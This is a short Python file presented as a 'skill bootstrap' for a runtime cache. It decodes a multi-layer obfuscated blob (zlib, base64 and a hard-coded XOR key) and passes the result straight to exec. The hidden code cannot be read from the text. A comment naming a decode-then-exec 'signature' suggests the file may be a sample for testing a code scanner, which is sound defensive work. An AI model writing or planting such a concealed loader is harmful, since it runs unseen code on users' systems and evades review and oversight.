#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdU8mSqkoQ/SAWTErBkrG8UMxCKzsRoUCgAS0s+PpHtx3x7u1lRkbmmTIrln2mpOPyNM0VTOE6NnXC+IvT4uu43rVqXqKIdLzD4ysxC3cB5KEydWOb6Unin5CbjUrNG9fhB13hrFOFIHVKf3JbrALNi+iFEbf5xT3yidRSv3KkJmWd0eGTWE73x1VaBFUee6+Vd/deo/tsLLLCdzQhjIfI22FW74+3Fef4mj7bzONnnRyDrkdYvREt9Giuc8Zt5FDqHRiucFZgtOWgG8bBq3lxeCoBYFVQK3qPZfFjWMFuLC6yFJsdFl+HdAROUDmZXtu8GVNec1fk9KEPyOXF7YjmGhVaNrymK2lhk/bpctJUwXwc3Kg9KK3t0zKfjDIe7Na+MukeNgGoojl+nVUu3nG7oAqWezxfGjdK/hAT38TiWKtg6mwLq8TCUChRnZZkPLf7K7Fo2EzkkZb+pud+lZMCrhdx1EfDPeNr/M0nkKYoH3tk7i7Ass0K3R4qCxufFonCmQaPmFZl/c8zlkNOzKRqRrV6lWz9ZMsEy0b1KRzObm1YONn8s9bdWYgK7yPR3nUlDwSqeTDfDO4HD3zzPeMiVCyqMezylcf9INCMTQam8oNv/rH2xc+zVmmtEzDOSCvo0mc9u69RrjDpP/vYRThXn/Fi2acluCz6FDf+vTgqbfHBAfLSQfBbb+Xi9rSzhpB3fvvx5ufdU/TZ3P/i+38/LC/DH/gK2XYI6EWsygcUDvQaECs9NuPSh7OUea3tAO3hjPOveUSkMGAEDxfKImYRN8EXzIzuN/5XLVl2yCnvfF3LhiCxvJ/7cWNrnxBI5XVi5ujxkW36g81vmQV+E89xdtju446/9QrJLZDffr73JyUjerytAVP1uO2/UuD8dd+ojm/dgNThyfA0WBHBKUBzjgu4/RdcJSIcRnb+yQcKSOgTBnQap0Rs4p2WHD7+0bP9Z+L37n+T5l1l"
_K = bytes.fromhex("a0dec2239ac6423732983323")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
